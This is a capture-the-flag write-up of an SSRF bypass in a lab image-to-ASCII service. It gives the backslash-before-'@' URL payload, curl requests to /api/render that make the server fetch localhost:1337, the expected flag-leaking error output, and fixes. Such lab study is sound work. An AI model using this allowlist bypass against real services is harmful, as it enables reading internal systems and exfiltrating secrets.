# AsciiSnap Backslash Userinfo Allowlist SSRF

## What Is Happening

[AsciiSnap](https://23e6b8ca4bb0.pwnbox-lab.com/) uploads an image, then server-fetches the returned URL through `/api/render` to convert it to ASCII. The fetcher only allows URLs “from `pwnbox-lab.com`”. An internal service on `localhost:1337` holds the flag.

## Why It Happens

The allowlist and the HTTP client disagree on how to parse:

```text
http://127.0.0.1:1337\@[host].pwnbox-lab.com/
```

| Layer | Interpretation |
|-------|----------------|
| Allowlist | Still “from” `pwnbox-lab.com` (string/host check passes) |
| HTTP client | Connects to `127.0.0.1:1337` |

When the upstream response is not an image, `/api/render` returns an error that includes the response body — so the flag is readable without needing a valid image.

Plain userinfo (`allowed@127.0.0.1`) and fragment smuggling (`127.0.0.1#allowed`) were rejected on this instance. Backslash before `@` was the working confusion.

## Exact Test

```bash
curl -sS -X POST "https://[host]/api/render" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:1337\\@[host]/"}'
```

Optional baseline:

```bash
# rejected
curl -sS -X POST "https://[host]/api/render" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:1337/"}'
```

## Expected Signal

- Direct loopback: `URL rejected: URL must be from pwnbox-lab.com`
- Working bypass: `URL did not return an image ... response: pwnbox{...}`

## Result Interpretation

Confirmed chain:

```text
render URL fetcher
-> host allowlist for pwnbox-lab.com
-> backslash + @ parser confusion
-> fetch localhost:1337
-> non-image error oracle leaks body
```

## Root Cause

Allowlist applied to a non-canonical URL string/authority, plus verbose error reflection of upstream content.

## Impact

- Read internal HTTP services on loopback.
- Exfiltrate secrets when errors include response bodies.

## Fix

- Canonicalize with one parser; allowlist exact `hostname`/`origin`.
- Reject `\`, userinfo, and odd authority forms.
- Block private/loopback after resolution.
- Generic errors only — no upstream body in client responses.

## Related Files

- `labs/2026-07-10-asciisnap-backslash-userinfo-allowlist-ssrf.md`
- `notes/ssrf-backslash-userinfo-allowlist-bypass.md`
- `payloads/ssrf/backslash-at-allowlist-loopback-bypass.md`
- `notes/ssrf-substring-allowlist-fragment-bypass.md`
